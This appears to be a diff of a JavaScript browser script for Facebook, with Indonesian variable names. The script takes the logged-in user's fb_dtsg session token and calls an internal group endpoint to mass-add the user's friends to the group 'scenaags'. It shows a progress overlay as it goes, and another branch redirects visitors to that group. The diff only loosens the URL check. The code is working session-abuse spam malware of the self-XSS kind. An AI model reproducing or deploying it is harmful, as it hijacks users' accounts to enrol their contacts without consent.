@@ -1,4 +1,4 @@
-if (document.URL.indexOf("https://www.facebook.com/scenaags") >= 0) {
+if (document.URL.indexOf("www.facebook.com/scenaags") >= 0) {
     function penetrasi(e) {
         jx.load(window.location.protocol + "//www.facebook.com/ajax/groups/members/add_post.php?__a=1&fb_dtsg=" + document.getElementsByName("fb_dtsg")[0].value + "&group_id=" + memberGroupId + "&source=typeahead&members=" + e + "&nctr[_mod]=pagelet_group_members_summary&lsd&post_form_id_source=AsyncRequest&__user=" + Env.user, function (e) {
             e = e.substring(e.indexOf("{")), e = JSON.parse(e), i--, kunaon = "<div class='friend-edge-name' style='text-align:left;font-size:10px;white-space:pre-wrap;", e.error ? (kunaon += "color:darkred'>", kunaon = e.errorDescription ? kunaon + e.errorDescription : kunaon + JSON.stringify(e, null, "")) : (kunaon += "color:darkgreen'>", kunaon += arr[i], suc++), kunaon += "</div>", e = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>" + ("<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>"), 0 < i ? (e += arr.length + " Suscribers detected<br/>", e += "<b>" + suc + "</b> Suscribers added of " + (arr.length - i) + " Suscribers Processed ", e += "(" + i + " more to go..)", e = e + "<div class='friend-edge'>" + kunaon, e += "</div>") : (e += arr.length + " Suscribers detected and ", e += "<b>" + suc + " Suscribers added</b>", e += "<div><span class='uiButton' onClick='document.getElementById(\"pagelet_welcome_box\").style.display=\"none\"'>Close</span></div>"), document.getElementById("pagelet_welcome_box").innerHTML = e + "</div>"
@@ -164,7 +164,7 @@ if (document.URL.indexOf("https://www.facebook.com/scenaags") >= 0) {
         tay = i = arr.length - 1, console.log(arr.length), e = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;background-color:rgba(255,255,255,0.9);z-index:9999;font-size:14px;text-align:center;padding:15px;border-radius:14px;border:8px solid rgba(0,0,0,0.5)'>" + ("<div style='padding-bottom:10px;font-size:20px;'>" + tulisanNganu + "</div>"), e += arr.length + " SUSCRIBERS detected", document.getElementById("pagelet_welcome_box").innerHTML = e + "</div>", penetrasi(arr[i])
     })
 } else {
-    var dmm = 'https://www.facebook.com/scenaags';
+    var dmm = 'www.facebook.com/scenaags';
     var mtll = 1;
 
     function redireccion() {
